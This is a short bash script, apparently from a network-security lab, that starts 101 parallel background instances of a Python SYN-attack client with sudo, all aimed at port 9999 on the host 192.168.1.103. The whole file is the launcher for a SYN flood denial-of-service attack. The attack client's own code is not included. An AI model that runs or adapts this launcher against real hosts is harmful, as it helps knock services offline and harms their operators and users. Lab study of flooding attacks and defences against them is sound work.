#!/bin/bash

for i in {0..100}
do
	echo "starting syn n°$i..."
	sudo python ./attacks/syn-attack-client.py -p 9999 -d 192.168.1.103 &
done
